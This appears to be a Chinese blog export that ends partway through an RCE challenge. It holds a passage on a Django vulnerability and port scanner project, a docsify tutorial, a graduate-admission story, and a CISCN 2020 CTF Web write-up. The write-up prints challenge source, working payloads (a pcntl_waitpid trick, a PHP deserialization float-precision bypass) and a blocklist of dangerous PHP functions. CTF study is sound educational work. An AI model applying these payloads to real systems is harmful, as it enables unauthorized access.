run 的目标查询出来，根据 CVE编号调用对应的 POC 脚本。最后更新数据库的扫描结果和扫描状态，由于在上一步中将数据插入数据库中可能会花费一点时间，所以需要使用 sleep() 等待数据插入后再进行查询工作和扫描工作，保证不遗漏扫描目标。\n\n```python\n@csrf_exempt\n@login_required\ndef start_Middleware_scan(request):\n    try:\n        url = request.POST.get('ip')\n        ip, port = urlparse(url).netloc.split(':')\n        CVE_id = request.POST.get('CVE_id').replace('-', \"_\")\n        time.sleep(5) #等待数据插入成功后在查询出来扫描\n        msg = Middleware_vuln.objects.filter(url=url, status='runing', CVE_id=CVE_id, time=Time)\n        print(msg)\n        #扫描条目可能不止一条，需要使用循环来扫描\n        for target in msg:\n            result = POC_Check(target.url, target.CVE_id)\n            #将扫描结果和状态更新\n            update_Middleware_data(target.url, target.CVE_id, Time, result)\n        return success()\n    except:\n        return error()\n```\n\n##  端口扫描\n\n> 本系统端口扫描当用户指定了目标IP地址后，系统正式工作，IP传入后台对目标进行扫描，扫描完成后将开放端口和对应服务显示到前端界面上。在“按端口分布划分”和“按协议类型划分”两个栏目中对端口划分进行讲解，使用户免于查询的繁琐。同时该模块还将内置常见端口查询表，在此可进行端口及其对应服务和功能的相关查询和筛选，通过这一系列功能用户能够更加清晰的认识到目标主机开放了哪些服务，以此来分析可能存在漏洞的服务。\n\n### 设计思路\n\n本系统端口扫描的实现方法是利用Python提供的库函数Socket进行调用，通过TCP三次握手与目标计算机的端口建立连接。当完成一次完整的三次握手时，则可以推断出端口和对应服务是开放的，反之则没有开放，为了提高了扫描的效率，本系统引入多线程扫描机制。\n\n### 实现效果\n\n![端口扫描](https://img.jwt1399.top//img/20210619183819.png)\n\n### 详细实现\n\n#### 端口扫描\n\n通过 Python 直接定义 socket，尝试与目标端口进行连接。本程序中使用`sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);`的方式进行 TCP 连接，调用`sock.connect_ex((ip,port))`，来尝试连接端口，如果端口开放则返回0，否则返回错误代码。使用try语句来捕获异常，如果 socket 连接超时，则返回异常处理信息。核心代码如下：\n\n```python\ndef socket_scan(self, hosts):\n    '''端口扫描核心代码'''\n    global PROBE\n    socket.setdefaulttimeout(1)\n    ip, port = hosts.split(':')\n    try:\n        if len(self.port) < 25:\n            # 创建套接字\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            # TCP/IP三次握手建立连接\n            result = sock.connect_ex((ip, int(port)))   \n# 调用socket.connect_ex((ip, port))，端口开放返回0，否则返回错误代码\n# 实现和nmap的全连接扫描类似的功能。\n            if result == 0:                     # 成功建立TCP链接\n                self.port.append(port)          # 结果集中增加端口\n                for i in PROBE:                 # 通过HTTP1.1刺探\n                    sock.sendall(i.encode())    # 发送完整的TCP数据包\n                    response = sock.recv(256)   # 接受最大256byte\n                    sock.close()\n                    if response:\n                        break\n                if response:\n                    for pattern in SIGNS:\n                        pattern = pattern.split(b'|')\n                        if re.search(pattern[-1],response, re.IGNORECASE): \n# 正则匹配banner信息与字典中的服务\n                            proto = '{}:{}'.format(pattern[1].decode(), port)\n                            self.out.append(proto)  # 添加至输出结果\n                            break\n        else:\n            self.num = 1\n    except (socket.timeout, ConnectionResetError): # 异常处理\n        pass\n    except:\n        pass\n\n```\n\n如果这样单线程（串行）阻塞运行，会耗费大量时间，因此，通过并发的方式，并发请求，提升扫描速度，通过对比扫描300个端口单线程需要30s左右，多线程仅需10s左右。\n\n本端口扫描功能中采用了并发64条线程来进行扫描，因此，在定义run方法时，每个线程扫描的两个端口号间差数为64，在程序中使用 concurrent.futures 来实现。concurrent.futures 模块提供了一个高水平的接口用于异步执行调用。异步执行可以使用线程实现，使用 ThreadPoolExecutor，或者独立的进程，使用 ProcessPoolExecutor 实现。两者都实现相同接口，都是由抽象 Executor 类定义的。\n\n```python\nTHREADNUM = 64  # 线程数\ndef run(self, ip):  #多线程扫描\n    hosts = []\n    global PORTS, THREADNUM\n    for i in PORTS:\n        hosts.append('{}:{}'.format(ip, i))\n    try:\n        with concurrent.futures.ThreadPoolExecutor(\n                max_workers=THREADNUM) as executor:\n            executor.map(self.socket_scan, hosts)\n    except EOFError:\n        pass\n```\n\n#### 端口查询表\n\n端口查询表功能通过收集网上端口信息建立端口查询库，涉及到的端口数据是存储在数据库中，包括端口ID、端口号、端口对应服务、端口对应协议和端口所属状态。端口查询表结构如下表所示。\n\n| 字段名   | 字段类型    | 允许空    | 是否主键 | 备注         |\n| -------- | ----------- | --------- | -------- | ------------ |\n| id       | integer     | Not  null | True     | 端口ID       |\n| num      | bigint      | Not  null | False    | 端口号       |\n| service  | text        | Not  null | False    | 端口对应服务 |\n| protocol | Varchar(20) | Not  null | False    | 端口对应协议 |\n| status   | Varchar(10) | Not  null | False    | 端口所属状态 |\n\n端口查询数据库采用Django Model进行建立，字段包含端口号、服务、协议、和状态。实现代码如下：\n\n```python\nclass PortList(models.Model):\n    '''端口查询表'''\n    num=models.BigIntegerField(verbose_name='端口号')\n    service=models.TextField(max_length=100,verbose_name='服务')\n    protocol=models.CharField(max_length=20,verbose_name='\n协议',blank=True,default='未知')\n    status=models.CharField(max_length=10,verbose_name='\n状态',blank=True,default='未知')\n    class Meta:  \n\t# 后台表头设置\n        verbose_name=verbose_name_plural='端口列表'\n```\n\n数据库建立后需要进行后台注册，这样可以进入后台对数据进行管理，实现代码如下：\n\n```python\n@admin.register(PortList)\nclass PortListAdmin(ImportExportModelAdmin):\n    # 设置哪些字段显示在后台\n    list_display = ('num', 'service', 'protocol', 'status',)\n    # 设置num字段进入编辑界面 \n    list_display_links = ('num',)  \n    search_fields = ('num', 'service',)\n    # 过滤器，按字段进行筛选\n    list_filter = ('protocol','status')\n    # 设置num为默认排序字段\n    ordering = ('num', )\n    list_per_page = 15  #设置每页显示数据条数\n```\n\n\n\n## 指纹识别\n\n> 该模块采用提取指纹特征码特征信息来识别Web指纹，系统通过构造大量特殊的HTTP请求与Web服务器交互，从其响应数据包信息中提取提取指纹特征信息，然后通过与指纹数据库进行比对，从而获取到Web服务器及应用的组件信息和版本信息。通过发现这些特征信息并对它进行识别可以帮助我们快速地制定渗透策略，是渗透环节中关键的一步。\n\n### 设计思路\n\n国内外对Web服务器及应用指纹的研究，主要都是通过构造大量特殊的HTTP请求与Web服务器交互，从其响应数据包信息中提取提取指纹特征信息，然后通过与指纹数据库进行比对，从而获取到Web服务器及应用的组件信息和版本信息。本文采用基于关键字特征匹配的方法实现指纹识别功能，为了使检测结果更加准确，对比网上一些主流的指纹数据库，对本系统的数据库进行了一系列优化。\n\n### 实现效果\n\n![finger](../images/毕设进程/finger.png)\n\n### 详细实现\n\n指纹识别流程中最关键的就是提取指纹特征这一步骤。提取指纹特征首先需要确定应该提取响应数据报文中的哪些数据。因此需要设计特征提取算法对响应数据报文进行分析，响应数据包是由响应行、响应头、响应体三部分构成。响应行由HTTP版本、状态码、状态码描述构成。响应头用于指示客户端如何处理响应体，响应头里面包含很多的组件信息，用于告诉浏览器响应的类型、字符编码服务器类型和字节大小等信息。响应体则是服务器根据客户端的请求返回给客户端的具体数据。响应头和响应体中包含了能够识别Web指纹组件的字段内容，因此，对响应头和响应体中关键字段的提取，是实现指纹识别技术的核心。\n\n指纹识别技术分为信息收集阶段和Web指纹识别阶段。\n\n(I)信息收集阶段:通过用户输入的URL，收集Web应用的特定字段信息，返回页面关键字或者特殊文件和路径等这些特征。收集的关键数据越多对接下来的指纹识别结果越准确。\n\n(2)Web指纹识别阶段:该阶段包含两部分，一部分是指纹库的建立，该部分主要负责从已知的Web应用程序中收集特征信息，并且建立指纹特征库；本文通过分析HTTP响应数据报文，设计了网站指纹的提取规则，通过分析响应头字段和响应体内容构建了一个指纹组件信息库，信息库采用JSON格式进行存储。指纹信息是从Wappalyzer和FOFA等平台上进行收集归纳的。另一部分从待测的Web应用程序中收集特征信息，并与指纹特征库中的数据进行比较，从而识别出待测的web应用程序。\n\n## 目录扫描\n\n> 目录识别参照dirsearch实现，包含php、asp、jsp等网站类型进行扫描，还设置了递归扫描和自定义扫描选项。支持自定义前后缀或者子目录。\n\n### 设计思路\n\nDirsearch 扫描的结果通过 JSON的格式保存在对应的路径下，因此我们可以减轻对数据库的依赖。获取的数据被分成 URL 和 TIMR，URL下又分为 content-length、path、redirect、starus四个部分。因为在 JSON 格式中被不同类型括号的数据会被 Django 解析为列表、字典等格式，因此我们需要对获得的 JSON 数据进行处理，将其转换为 Django 可以识别的数据，使之在前端进行读取。\n\n要正确解析数据，需要先理解 Python 数据结构和 JSON 数据的转换方法。我们基于当前的固定的 JSON 格式去解析取得的数据。\n\n### 实现效果\n\n![目录识别](https://img.jwt1399.top//img/20210303174736.png)\n\n\n\n![目录扫描结果](https://img.jwt1399.top//img/20210619182009.png)\n\n## 信息泄露\n\n该模块主要为用户提供常见的信息泄露检查。在前端直观的展示后台地址、配置文件等可能存在泄露的信息，在结果列表中，用户可以非常清晰的知道某个Web服务存在的信息泄露问题。\n\n![infoleak](https://img.jwt1399.top//img/20210620114317.png)\n\n## 旁站探测\n\n该模块主要对通过 IP 地址，直接获取与当前 IP 所在服务器上的其它网站， 本模块直接调用 api 实现\n\n![旁站探测](https://img.jwt1399.top//img/20210210100407.png)\n\n## 域名探测\n\n该模块主要通过调用 api 来扫描网站的子域名\n\n![域名探测](https://img.jwt1399.top//img/20210620114025.png)\n\n## 安全导航\n\n安全导航页面的灵感来自于[Viggo](http://viggoz.com/)大佬开发的[Webstack](http://webstack.cc/)项目，该项目是基于Bootstrap开发的纯前端页面，因此前端我沿用了`Webstack` 的风格并融合了`Tabler UI `风格，并用 `Django `写了后台管理，可在线对分类和条目进行管理。\n\n### 前端页面\n\n![导航前端](https://img.jwt1399.top//img/20210421004925.png)\n\n### 后台管理页面\n\n![导航后台](https://img.jwt1399.top//img/20210421005730.png)\n\n### 数据库设计\n\n![](https://img.jwt1399.top//img/20210303172247.png)\n\n#### 导航条目-Item\n\n> 标题title   描述desc   网址url   分类category(外键)   图片img    图片宽度img_width\n\n```python\nclass Item(models.Model):\n    '''导航条目'''\n    title = models.CharField(max_length=50,verbose_name='名称')\n    desc = models.TextField(max_length=100,verbose_name='描述')\n    url = models.URLField(verbose_name='网址',blank=True)\n    img = models.URLField(default='https://jwt1399.top/favicon.png',verbose_name='logo')\n    img_width = models.IntegerField(default=45, verbose_name='图片宽度')\n    category = models.ForeignKey(Category, blank=True, null=True, verbose_name='分类', on_delete=models.CASCADE)\n    class Meta:\n        verbose_name=verbose_name_plural='导航条目'\n    #后台条目图片预览\n    def img_admin(self):\n        return format_html( '<img src=\"{}\" width=\"50px\" height=\"50px\" style=\"border-radius: 50%;\" />',self.img,)\n    img_admin.short_description = 'logo预览'\n    def __str__(self):\n        return self.title\n```\n\n#### 条目分类-Category\n\n> 名称name   排序 sort   是否添加到导航栏add_menu   图标icon\n\n```python\nclass Category(models.Model):\n    \"\"\"条目分类\"\"\"\n    name = models.CharField(max_length=20, verbose_name='名称')\n    sort = models.IntegerField(default=1, verbose_name='显示顺序')\n    add_menu = models.BooleanField(default=True, verbose_name='添加到导航栏')\n    icon = models.CharField(max_length=30, default='fas fa-home',verbose_name='图标')\n    class Meta:\n        verbose_name_plural=verbose_name = '分类'\n\n    #统计分类对应条目数,并放入后台\n    def get_items(self):\n        return len(self.item_set.all())\n    get_items.short_description = '条目数'  # 设置后台显示表头\n    #后台图标预览\n    def icon_data(self):#引入Font Awesome Free 5.11.1\n        return format_html('<h1><i class=\"{}\"></i></h1>',self.icon) #转化为<i class=\"{self.icon}\"></i>\n    icon_data.short_description = '图标预览'\n    def __str__(self):\n        return self.name\n```\n\n## 文档页\n\n将 Docsify 直接嵌入了 Django 中构造了文档页。\n\n![文档页](https://img.jwt1399.top//img/20210620113024.png)\n\n## 兼容性\n\n### Phone端\n\n| 竖屏                                                 | 横屏                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20210620134517.png) | ![](https://img.jwt1399.top//img/20210620134520.png) |\n\n### Pad端\n\n| 竖屏                                                 | 横屏                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20210620134523.png) | ![](https://img.jwt1399.top//img/20210620134527.png) |\n\n## 版本变更记录\n\n### v2.7（2021-04-18）\n\n- 新增`域名探测`功能；\n- 新增`中间件漏洞`扫描；\n- 修复`忘记密码`功能；\n- 优化AWVS未启动报错信息；\n- 优化`用户登录`逻辑；\n- 优化`漏扫详情`页UI；\n- 优化导航栏布局；\n- 优化若干小细节；\n\n### v2.6（2021-03-31）\n\n- 新增漏洞`扫描详情`功能；\n- 新增首页 `仪表盘`；\n- 安全导航页导航栏`移动端优化`；\n- 安全导航页目录栏`缩放优化`；\n- 注册&登录界面优化；\n- 文档页`导航栏优化`；\n- 新增 `UI` 夜间模式；\n- 修复若干`UI` 显示Bug；\n\n### v2.5（2021-03-02）\n\n- 新增了`漏洞扫描`功能；\n- 端口扫描页新增`常见端口查询表`；\n- 信息泄露页新增`常见信息泄露列表`；\n- 指纹识别页新增`数据分析`图表；\n- 漏洞扫描页`界面优化`；\n\n### v2.4（2021-02-22）\n\n- 新增了`目录识别`功能；\n- 重写`欢迎页`；\n- 安全导航页`移动端界面`适配；\n- 安全导航页`UI优化`；\n- 目录识别页`界面优化`；\n- 指纹识别页新增`常见指纹`显示与搜索；\n- 引入`Boostrap Table`实现分页；\n- 淘汰 `LayUI` 改用 `Layer` 进行弹窗；\n- 文档页增加`导航栏`；\n\n### v2.3（2021-02-08）\n\n- 全新的`页面布局`；\n- UI适配`移动端`；\n- 优化`导航页布局`；\n- 优化一系列`UI`显示问题；\n    - 优化了`手机端页脚`显示\n    - 优化了`平板端导航条`显示\n    - 页面底部增加`回到顶部`按钮\n    - 按钮`触发跳转`页面相对位置\n    - `回车键`触发查询按钮\n    - 优化`导航页页脚`显示\n\n### v2.2 （2021-02-03）\n\n- 新增了`信息泄露探测`功能；\n- 新增了`旁站探测`功能；\n- 新增了导航页`数据分析`功能；\n- 新增了基于`Docsify`的`文档页`；\n- 重构了`静态文件static`文件结构\n- 优化了项目`文件结构`；\n- 美化了`注册`页面；\n- 引入了`动态粒子`背景效果；\n- 修复了一些 `UI` 显示问题；\n\n### v2.1 （2021-01-13）\n\n- 新增了`指纹识别`功能；\n- 新增了`登录和注册功能`功能；\n- 新增了`欢迎页`；\n- ~~新增了`文档页`；~~\n- 修复了一些 `UI` 显示问题；\n\n### v2.0（2021-01-04）\n\n- 新增了`端口扫描`功能；\n- 新增了`安全导航`功能；\n- 连入了 `SQLite` 数据库，后续考虑改为`MySQL`；\n- 修复了一些 `UI` 显示问题；\n- 修复了后台头部小图标无法显示问题；\n- 新增了后台数据导入导出功能；\n\n### v1.0（2020-12-20）\n\n- 基于`Tabler`框架构造了前端页面；\n- 采用基于`Python`的 Django 框架编写后端；\n- 引入了`SimpleUi`美化 Django 后台框架；\n- 引入了`Font-Awsome 5.15.1`图标；\n\n## 项目部署\n\n### 本地部署\n\n1.使用 Pycharm 打开本项目，在 Pycharm 的 `setting`--->`Project Interpreter`中 add 一个新的虚拟环境。\n\n2.在该虚拟环下打开 Pycharm 自带 Terminal 运行 `pip install -r requirements.txt` 下载项目所需的第三方包。\n\n3.现在项目已经可以正常运行了，但是想要使用漏洞扫描功能，需要安装AWVS，并在项目的`setting.py` 中配置 AWVS的 `API URL`和`API KEY`\n\n4.忘记密码功能相关配置在项目的`setting.py` 中修改\n\n```python\nEMAIL_HOST = 'smtp.163.com'\nEMAIL_PORT = 25               # 发件箱的smtp服务器端口\nEMAIL_HOST_USER = 'xxx'       # 你的邮箱账号\nEMAIL_HOST_PASSWORD =\"xxx\"    # 邮箱授权码\nEMAIL_USE_TLS = True          # 这里必须是 True，否则发送不成功\nEMAIL_FROM = 'xxx'            # 你的邮箱账号\nDEFAULT_FROM_EMAIL = 'xxx'    # 你的邮箱账号\n```\n\n5.创建超级管理员 `python manage.py createsuperuser`\n\n### 服务器部署\n\n请参考：[使用宝塔面板快速部署Django项目](https://www.django.cn/article/show-30.html)\n\n## TO DO\n\n> 不论是开发还是安全感觉都有很长的路要走，路漫漫其修远兮，吾将上下而求索，共勉 ！\n\n- [ ] 安全工具页\n- [ ] 安全图书页\n- [ ] 引入MySQL数据库\n- [ ] 扫描算法优化\n- [ ] 代码变量、数据库结构优化\n- [ ] 漏洞报告导出功能\n- [ ] 页面异步刷新\n\n## 赞助💰\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["渗透测试","毕业设计","工具开发"],"categories":["Web"]},{"title":"Django引入docsify文档","url":"/posts/61836.html","content":"![](https://img.jwt1399.top//img/20210131114325.png)\n### docsify 介绍\n>  **docsify：**一个神奇的文档站点生成器。\n>\n> **官网：**https://docsify.js.org/\n\n我们在开发项目时，需要一份精致的开发文档，那么使用 `docsify` 是个不错的选择，`docsify` 是一个快速生成 `Vue` 风格文档的工具，它直接加载 `Markdown` 文件并动态渲染，同时还可以生成封面页。我们只需要写完 `Markdown` 文档，就可以看到类似下方图片的文档页面了。\n\n![](https://img.jwt1399.top//img/20210131103745.png)\n\n基础的配置和搭建我这里就不说了，官网有详细的步骤\n\n### docsify 嵌入Django项目\n\n1.根据官网教程生成 `docs` 文件夹\n\n![](https://img.jwt1399.top//img/20210131110145.png)\n\n2.将 `docs` 文件夹（除去index.html）放入 **Django** 项目的 `static` 文件夹中（下图我已经做了一些文档配置，所以多了一些文件）\n\n![](https://img.jwt1399.top//img/20210131110537.png)\n\n3.将 `docs` 中的 `index.html` 放入 `templates` 文件夹中，我这里将 `index.html` 改为了 `docs.html`\n\n![](https://img.jwt1399.top//img/20210131111242.png)\n\n4.在 `docs.html` 中设置静态文件路径\n\n```js\n<script>\n    window.$docsify = {\n    basePath:'/static/docs/',\n    ...\n    ...\n\t}\n</script>\n```\n\n5.在`view.py`增加一个视图,返回文档首页 `docs.html`\n\n```python\ndef docs(request):\n    return render(request, 'docs.html')\n```\n6.在`urls.py`中增加一个路由\n\n```python\npath('docs', views.docs, name='docs'),\n```\n\n7.运行 Django 项目，访问 `127.0.0.1:8000/docs` 就可以成功看到文档页了","tags":["Django"],"categories":["Python"]},{"title":"保研电子科大经验分享","url":"/posts/39301.html","content":"### 写在前面\n\n> 努力不一定有收获，不努力就一定没有收获，机会永远把握在自己手里，越努力越幸运！遇事不要急躁，慢慢来，比较快！\n\n2020年10月12日11点58分，接受了电子科技大学的待录取通知，至此我的保研之旅正式结束。感谢一路上给予我帮助的家人、老师和朋友🙏。\n\n\n\n| 本科学校                                                     | 保研最终去向                                                 |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| <img src=\"https://img.jwt1399.top//img/20201013102356.jpeg\" width =\"400\" height=\"100\" /> | <img src=\"https://img.jwt1399.top//img/20201013095231\" width=\"500\" height=\"100\"/> |\n\n### 个人情况\n\n**本科学校**：西华大学\n**本科专业：**信息安全\n**政治面貌：**中共党员\n**绩点**：3.81\n**成绩排名：**1/85（专业第一）\n**四六级：**四级（475）、六级没过（英语真是我一生的痛啊😭，明明知道重要，但我就是不想学）\n**学习实践类获奖：**连续三年校一等奖学金、国家奖学金、国家励志奖学金、四川省大学生“综合素质A级证书”、四川省优秀大学毕业生\n**学生工作类获奖：**校优秀共青团干部、连续两年校优秀学生干部、党校优秀学员 \n**学科竞赛类获奖：**中国大学生计算机设计大赛三等奖 、全国大学生信息安全与对抗技术竞赛二等奖、四川省大学生信息安全技术大赛一等奖 、全国大学生信息安全竞赛创新实践能力赛赛区二等奖、四川省计算机作品大赛二等奖、四川省计算机设计大赛二等奖等等\n\n### 我的保研流程\n\n> 以下只是我个人所经历的流程，仅供参考哈，我个人没有参加夏令营，只参加了预推免。\n>\n> 注：今年因为疫情原因，保研工作有所推迟\n\n`流程：本校推免资格申请-->联系院校和导师-->拿到本校推免资格-->报名预推免-->参加预推免复试-->填报推免系统`\n\n#### 本校推免资格申请\n\n9月10号辅导员发出了保研通知，有意向的同学提交相应申请材料，只需要按照要求提交相应的材料就可以啦。\n\n#### **联系院校和导师**\n\n其实这个步骤可以很早就进行，因为我不是十分肯定自己是否能保研，提交材料后，过几天辅导员会发一个大学前三年的成绩排名表，通过排名我确定自己是可以保研的，所以马上开始确定学校和导师，因为我不想出川，所以将目标锁定在了电子科技大学、四川大学、西南交通大学三所学校上面，查阅资料发现川大对学生的本科出身要求很高（貌似985、211才行），于是果断放弃了川大，其实最想去的学校是电子科技大学，电科的计算机感觉还是很不错的，而且校园环境很nice😁，去找专业老师聊了一哈，老师给我说了哈电科实验室团队和老师的一些情况，给我推荐了几位老师，并推荐我尝试一些川外的学校（山东大学网络安全学院、杭州电子科技大学网络安全学院等），但我还是更想留着川内，于是联系了电科的第一位老师，跟老师通了个电话，说了哈自己的基本情况，老师约我去电子科技大学面谈，我按照约定时间去了电科南门，由于疫情原因进不了校，我和老师在电科门口聊了一会，老师说联系他的人很多，让我回去等答复。回去后让专业老师帮忙问了哈情况，电科老师给我的回复是“我很好，但是不适合他们团队”（应该还是自己实力不够），第一次面试就此告终。然后联系了第二位电科老师，加了老师微信，跟老师约了时间视频通话，后面老师给我打了语音电话，聊了一些基本情况，问了一些专业知识，老师最后说同意接收我（哇，当时激动坏了），老师让我按照正常流程来就可以了，于是我就没有再联系其他学校和导师了。\n\n#### 拿到本校推免资格\n\n9月23号本校研究生官网拟推荐免试攻读硕士研究生资格名单，顺利的话，你就可以在名单上看到自己的名字啦。\n\n#### 预推免\n\n9月24日电科计算机学院出了“2021年接收优秀应届本科毕业生免试攻读研究生工作安排通知”，按照上面的要求发邮箱提交材料，在电科推免系统上填报信息，填写完之后注意查看回复和系统变化，通知上面还会有复试时间和复试考查内容，接下来的时间准备预推免面试就可以啦。\n\n#### 参加预推免复试\n\n因为疫情，今年复试是网络面试，需要双机位，10月9日举行了复试测试，老师会跟你测试网络设备是否正常（音效很不好，还有回音），并跟你说明复试流程，10月10日正式面试，我运气绝了，抽到了第一个面试，紧张死我了，音效又不好，很难受。面试首先是确认身份，然后正式开始，首先投屏ppt进行自我介绍，然后是英语面试，老师问了我两个问题，一个是为什么选择电子科技大学，另一个是向她介绍一哈我的优势，接下来是专业面试，老师投屏让我选择一个word文档，我选了一个，打开是一道归并排序的算法题，题目就有 A4 纸的 2/3（当时一脸懵），过度紧张的我，当时脑子一片空白，回答得并不好。最后是综合面试，老师根据我的简历和我导师研究方向问了一系列问题。面完感觉很差，都答得不好。10月11日下午一点多一点出了录取通知，被调剂到了专硕（导师说：专硕学硕区别不大），但是录取了，还是很开心的，至少有书读了。\n\n#### 填报推免系统\n\n志愿填报系统是10月12日0点开放，个人基本信息和复试缴费在10号开通，电科要求12号9点半之前填好，我11号晚上熬夜就填好了志愿，12号早上10点收到了电科的复试通知（只是一个流程而已），我立马点击了确认，快12点的时候收到了电科的拟录取通知，点完接受保研就告一段落了。\n\n![](https://img.jwt1399.top//img/20201013104207.png)\n\n### 经验分享\n\n1.提前做好**个人简历**和**个人介绍PPT**，重点突出自己在本科的科研奖项，绩点排名，实习经历、编程能力等，要让面试老师直观看到你的优势。\n\n2.熟悉大一到大三的**专业课**，尤其是跟你以后方向相关的知识，数据结构与算法、C语言、计算机网络、操作系统、数据库、计算机组成原理这些都是很重要的，面试也会问到相关知识。\n\n3.认真对待**面试**，能不能成功录取就看面试了，所以一定要做好充分的前期准备，才能脱颖而出，拿到好的面试成绩。提前排练一段自我介绍，查阅一些基础专业知识，自己感兴趣的研究方向等，在面试过程中，老师很大可能会问到专业相关的知识，还有一定要调整好自己的心态，不要过于紧张，从容面试，语速放慢，让老师感觉你是一个稳重的人。反正一定要做好前期准备！！机会总是留给有准备的人！！！\n\n4.最好大三暑假就参加**保研夏令营**，拿到优秀营员基本就稳了（不排除个别学校鸽），我是因为英语问题，所以没有参加夏令营。\n\n### 写在后面\n\n希望我的经验能够给想保研的学弟学妹们一些帮助，其实保研并不难，难的是有了目标，怎么样做和怎么坚持下来。大学四年时光很快，保研最重要还是看大一到大三这三年的专业绩点，希望学弟学妹们能够早一点确定自己的方向，才会有更多的可能性。\n\n### 录取通知书\n\n2021年7月2号更新：今天收到了学校寄来的录取通知书，今年的录取通知书改版了，比原来的好一点了。\n\n| ![录取通知书](https://img.jwt1399.top//img/20210706193644.jpg) | ![通知书合集](https://img.jwt1399.top//img/20210706193650.jpg) |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["保研","经验分享"],"categories":["Share"]},{"title":"2020CISCN-初赛Web","url":"/posts/17919.html","content":"\n不出意外，这应该是最后一次打国赛了，总共22道题，解出15道题，Web一共5道题，最后做出4道题，实验室的两支队伍，最终西南赛区第6和第10，全国第35和53，成功晋级分区赛。\n\n## easyphp\n\n**考点：PHP多线程**\n\n**题目源码：**\n\n```php\n<?php\n    //题目环境：php:7.4.8-apache\n    $pid = pcntl_fork();\n    if ($pid == -1) {\n        die('could not fork');//创建失败就退出\n    }else if ($pid){ //从这里开始写的代码是父进程的\n        $r=pcntl_wait($status);//等待或返回fork的子进程状态\n        if(!pcntl_wifexited($status)){//检查子进程状态代码是否代表正常退出。\n            phpinfo();\n        }\n    }else{//子进程\n        highlight_file(__FILE__);\n        if(isset($_GET['a'])&&is_string($_GET['a'])&&!preg_match(\"/[:\\\\\\\\]|exec|pcntl/i\",$_GET['a'])){\n            call_user_func_array($_GET['a'],[$_GET['b'],false,true]);//调用回调函数，并把一个数组参数作为回调函数的参数\n        }\n        posix_kill(posix_getpid(), SIGUSR1);\n    }\n```\n\n让子进程异常退出，进入到phpinfo中\n\n**Payload:**\n\n```php\n?a=call_user_func&b=pcntl_waitpid \n```\n\n执行后 call_user_func_array() 就变成 pcntl_waitpid(false,true)，子进程变为僵尸进程，然后符合else if 执行phpinfo，从而得到flag\n\n![](https://img.jwt1399.top//img/20200825112819.png)\n\n## easytrick\n\n**考点:PHP弱类型、反序列化、PHP精度问题**\n\n**题目源码：**\n\n```php\n<?php \nclass trick{ \n    public $trick1; \n    public $trick2; \n    public function __destruct(){ \n        $this->trick1 = (string)$this->trick1; \n        if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){ \n            die(\"你太长了\"); \n        } \n        if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){ \n            echo file_get_contents(\"/flag\"); \n        } \n    } \n} \nhighlight_file(__FILE__); \nunserialize($_GET['trick']); \n```\n\n题目要求 trick1 和 trick2 的值和类型都不能相等，trick1 和 trick2 长度小于5，并且要让 trick1 和 trick2 的 md5 值相等\n\n**EXP：**\n\n```php\n<?php \nclass trick{\n    public $trick1 = 0.01;\n\tpublic $trick2 = 0.1*0.1;\n}\n$exp = new trick();\necho serialize($exp); \n?>\n```\n\n**Payload:**\n\n```php\nO:5:\"trick\":2:{s:6:\"trick1\";d:0.01;s:6:\"trick2\";d:0.010000000000000002;} \n```\n\n![](https://img.jwt1399.top//img/20200825110028.png)\n\n满足所有条件，成功 bypass ,获得 flag\n\n![](https://img.jwt1399.top//img/20200825104524.png)\n\n## rceme\n\n**考点：模板注入、RCE**\n\n**题目源码：**\n\n```php\n<?php \nerror_reporting(0); \nhighlight_file(__FILE__); \nparserIfLabel($_GET['a']); \nfunction danger_key($s) { \n    $s=htmlspecialchars($s); \n    $key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');\n    $s = str_ireplace($key,\"*\",$s); \n    $danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');\n    foreach ($danger as $val){ \n        if(strpos($s,$val) !==false){ \n            die('很抱歉，执行出错，发现危险字符【'.$val.'】'); \n        } \n    } \n    if(preg_match(\"/^[a-z]$/i\")){ \n        die('很抱歉，执行出错，发现危险字符'); \n    } \n    return $s; \n} \nfunction parserIfLabel( $content ) { \n    $pattern = '/\\{if:([\\s\\S]+?)}([\\s\\S]*?){end\\s+if}/'; \n    if ( preg_match_all( $pattern, $content, $matches ) ) { \n        $count = count( $matches[ 0 ] ); \n        for ( $i = 0; $i < $count; $i++ ) { \n            $flag = ''; \n            $out_html = ''; \n            $ifstr = $matches[ 1 ][ $i ]; \n            $ifstr=danger_key($ifstr,1); \n            if(strpos($ifstr,'=') !== false){ \n                $arr= splits($ifstr,'='); \n                if($arr[0]=='' 